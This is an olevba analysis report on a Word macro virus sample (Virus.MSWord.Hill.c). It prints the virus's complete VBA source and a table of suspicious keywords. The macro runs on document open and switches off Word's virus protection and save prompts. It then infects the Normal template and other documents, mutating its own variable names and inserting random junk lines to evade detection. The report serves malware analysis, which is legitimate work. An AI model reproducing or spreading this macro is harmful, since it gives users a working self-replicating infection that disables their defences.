olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.c-bee8e337fb406f656d0abdc767e33cbe451bea6e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.c-bee8e337fb406f656d0abdc767e33cbe451bea6e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public MountainJ, MountainRN
Public MountainMT, MountainVT
Sub AutoOpen()
   On Error Resume Next
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   Randomize
   MountainMT = "Mountain"
   MountainVT = MountainGN(20, 26, 65)
   MountainRN = Mid(Str(Int(20 * Rnd + 1)), 2)
   If NT.CountOfLines < 60 Then
      MountainS = MountainCM(AD, NT)
   Else
      If AD.CountOfLines < 60 Then
         MountainS = MountainCM(NT, AD)
      End If
   End If
End Sub
Function MountainCM(MountainOC, MountainKC)
   MountainJ = 1
   For I = 1 To MountainOC.CountOfLines
      If MountainCS(MountainOC.Lines(I, 1)) <> 1 Then
         MountainLN = MountainRP(MountainOC.Lines(I, 1), MountainMT, MountainVT)
         MountainLN = MountainRP(MountainLN, "20", MountainRN)
         MountainKC.InsertLines MountainJ, MountainLN
         MountainJ = MountainJ + 1
         If MountainCS(MountainOC.Lines(I, 1)) = 0 Then
            R = Rnd
            If R < 1 And R > 0.08 Then
               MountainKC.InsertLines MountainJ, " " + MountainGN(20, 26, 65) + " = " + Chr(34) + MountainGN(20, 128, 48) + Chr(34) + " " + Chr(39) + MountainGN(10, 128, 48)
            End If
            If R < 0.08 And R > 0.05 Then
               MountainKC.InsertLines MountainJ, " '" + MountainGN(20, 128, 48)
            End If
            If R < 0.05 And R > 0.03 Then
               MountainKC.InsertLines MountainJ, " '"
            End If
            If R > 0.03 Then MountainJ = MountainJ + 1
         End If
      End If
   Next
End Function
Function MountainCS(MountainST)
   MountainCS = 0
   For I = 1 To Len(MountainST)
      If Mid(MountainST, I, 1) = Chr(39) Then MountainCS = 1
   Next
   If Mid(MountainST, 1, 1) <> " " Then MountainCS = 2
End Function
Function MountainGN(MountainSA, MountainSB, MountainSC)
   MountainGN = ""
   For MountainI = 1 To Int(MountainSA * Rnd + 1)
      MountainGN = MountainGN + Chr(Int(MountainSB * Rnd + MountainSC))
   Next
End Function
Function MountainRP(MountainST, MountainZA, MountainZB)
   MountainLA = Len(MountainZA)
   For ii = 1 To Len(MountainST)
      If Mid(MountainST, ii, MountainLA) = MountainZA Then
         MountainST = Mid(MountainST, 1, ii - 1) + MountainZB + Mid(MountainST, ii + MountainLA)
      End If
   Next
   MountainRP = MountainST
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

